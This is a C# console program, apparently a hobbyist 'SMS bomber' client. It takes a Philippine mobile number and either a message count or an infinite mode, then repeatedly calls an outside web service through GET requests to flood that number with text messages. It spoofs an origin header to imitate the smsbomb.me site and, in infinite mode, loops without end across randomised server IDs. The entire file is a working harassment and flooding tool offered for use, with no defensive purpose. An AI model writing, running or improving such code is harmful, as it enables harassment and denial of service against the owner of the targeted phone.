using Newtonsoft.Json;
using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace SMSBomberAPITest
{
    internal class Program
    {
        private static readonly HttpClient _http = new HttpClient();
        
        // An example I guess
        static async Task Main(string[] args)
        {
            int defAmount = 0;
            Random rnd = new Random();
            _http.DefaultRequestHeaders.Add("origin", "https://smsbomb.me"); //emulate requests (idk y)           
            restart:
            bool infinite = false;
            Console.WriteLine("Infinite Messages?");
            string isInfinite = Console.ReadLine();
            if (isInfinite.ToLower().Equals("y"))
                infinite = true;
            else
                infinite = false;
            Console.WriteLine("Enter Number:");
            string number = Console.ReadLine();
            if (!number.StartsWith("09") || number.Length != 11)
            {
                Console.WriteLine("Please enter a valid number");
                goto restart;
            }      
            Console.WriteLine("Enter amount of messages: ");
            string amount = Console.ReadLine();
            if (int.TryParse(amount, out defAmount) && !infinite)
            {
                var res = await _http.GetAsync($"https://zekezeek.pythonanywhere.com?server=1&number={number}&amount={defAmount}"); //Original type is "GET" so we use GET too       
                dynamic parsed2 = JsonConvert.DeserializeObject(res.Content.ReadAsStringAsync().Result);
                Console.WriteLine($"\nStatus:\nNumber :{parsed2.number}\nAmount :{parsed2.amount}\nSuccess? :{parsed2.status}");

            }
            else if (infinite)
            {   
                // !! WARNING !! using This infinite method thing can send tons of requests
                while (true)
                {
                    var res = await _http.GetAsync($"https://zekezeek.pythonanywhere.com?server={rnd.Next(0,6)}&number={number}&amount=1"); //Only 1 message, change if you like
                    dynamic parsed2 = JsonConvert.DeserializeObject(res.Content.ReadAsStringAsync().Result);
                    Console.WriteLine($"\nStatus:\nNumber :{parsed2.number}\nAmount :{parsed2.amount}\nSuccess? :{parsed2.status}");
                }
            }
            else
            {
                Console.WriteLine("Please enter a valid number of messages, 1-99999");
                goto restart;
            }
        }
    }
}
